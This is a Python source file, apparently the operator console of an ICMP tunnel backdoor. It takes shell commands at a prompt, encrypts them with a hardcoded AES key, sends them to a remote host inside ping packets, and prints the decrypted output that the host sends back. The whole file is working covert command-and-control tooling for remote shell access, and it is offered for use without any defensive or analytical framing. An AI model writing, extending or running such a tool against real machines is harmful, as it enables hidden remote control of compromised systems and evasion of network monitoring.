from tunnel import Convert2Icmp
from tunnel import Listener
from loader import AES_Decrypt
from loader import AES_Encrypt
import re
import sys
import getopt

key = 'icmpyydsicmpyyds'


class Execute:
    def __init__(self, host, cmd, bind):
        self.cmd = AES_Encrypt(key, cmd)
        self.bind = bind
        icm = Convert2Icmp(host, self.cmd)
        icm._ping()
        li = Listener(bind, 1)
        msg = li.os_listener()
        o = handler(msg)
        if o is not None:
            sys.stdout.write(o.replace("\\t", "\t").replace("\\n", "\n"))
        else:
            sys.stdout.write("[-] timeout\n")


def handler(msg):
    try:
        if ";;" in str(msg[0]):
            o = re.findall(r";;.*?;;", str(msg[0]))
            if o is not None:
                o = o[0][2:-2]
            return AES_Decrypt(key, o)
    except IndexError:
        sys.stdout.write("[-] maybe something wrong, try again\n")
    return


def getArg():
    rhost = "192.168.1.101"
    if len(sys.argv) < 2:
        sys.stdout.write("please input: -r 'rhost' -b 'bindhost'" + "\n")
        sys.exit(1)

    try:
        opts, args = getopt.getopt(sys.argv[1:], "r:b:", ["rhost=", "bind="])
    except getopt.GetoptError:
        sys.stdout.write("please input: -r 'rhost' -b 'bindhost'" + "\n")
        sys.exit(1)

    for opt, arg in opts:
        if opt in ("-r", "--rhost"):
            rhost = arg
            sys.stdout.write("[*] rhost: " + rhost + "\n")
        elif opt in ("-b", "--bind"):
            bind = arg
            sys.stdout.write("[*] bindhost: " + bind + "\n")

    return [rhost, bind]


if __name__ == '__main__':
    if sys.version_info < (3, 0):
        sys.stdout.write("wrote by Python 3.x\n")
        sys.exit(1)

    rhost, bind = getArg()

    while True:
        cmd = input("=># ")
        if "exit" in cmd:
            sys.stdout.write("[*] exit\n")
            break
        Execute(rhost, cmd, bind)
        sys.stdout.write("[*] finish\n")
